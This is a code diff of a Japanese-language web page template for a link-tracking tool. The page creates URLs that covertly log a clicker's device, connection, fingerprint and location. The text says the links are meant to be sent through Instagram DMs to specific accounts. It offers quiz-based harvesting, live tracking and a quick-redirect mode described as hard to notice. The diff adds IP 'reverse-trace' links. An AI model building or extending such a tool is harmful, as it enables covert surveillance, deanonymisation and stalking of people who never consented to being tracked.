@@ -3,8 +3,8 @@
 
 {% block content %}
 <h1>リンク追跡</h1>
-<p class="dim">作ったURLを踏ませると、端末・回線・端末キー・位置情報が記録されます。
-InstagramのDMで送って踏ませる用途を想定しています。</p>
+<p class="dim">作ったURLを踏ませると、端末・回線・端末キー・指紋・位置情報が記録されます。
+全モードで同じだけ取得します。モードは「見せ方」の違いだけです。</p>
 
 <form method="post" action="/links/add" class="card">
   <label>名前 <input name="name" placeholder="例: 裏垢Aに送る"></label>
@@ -18,13 +18,14 @@ InstagramのDMで送って踏ませる用途を想定しています。</p>
       <option value="live">リアルタイム追跡（開いている間ずっと）</option>
       <option value="quiz">クイズ／質問形式（回答別に情報を取得）</option>
       <option value="identify">訪問者識別カードを出す</option>
-      <option value="redirect">即リダイレクト（気づかれにくい）</option>
+      <option value="redirect">即リダイレクト（一瞬だけ収集してから飛ぶ）</option>
     </select></label>
   <button type="submit">リンクを作成</button>
 </form>
 
-<p><a href="/link/me" target="_blank">自分のIPで動作確認する</a></p>
-<p><a href="/livetrack">表示・文言の設定</a></p>
+<p><a href="/link/me" target="_blank">自分のIPで動作確認する</a> ／
+   <a href="/reverse">IPを逆探知する</a> ／
+   <a href="/livetrack">表示・文言の設定</a></p>
 
 <h2>作成済み {{ links|length }} 件</h2>
 <table id="linktable"><tr><th>名前</th><th>URL</th><th>飛び先</th><th>モード</th><th>ヒット</th><th>状態</th><th></th></tr>
@@ -37,6 +38,8 @@ InstagramのDMで送って踏ませる用途を想定しています。</p>
   <td>{{ l.hit_count }}</td>
   <td>{% if l.active %}有効{% else %}<span class="badge">停止中</span>{% endif %}</td>
   <td>
+    <a class="mini" href="/link/{{ l.code }}/questions">クイズ</a>
+    <a class="mini" href="/link/{{ l.code }}/reverse">逆探知</a>
     <form method="post" action="/link/{{ l.code }}/toggle"><button>切替</button></form>
     <form method="post" action="/link/{{ l.code }}/delete"><button>削除</button></form>
   </td>
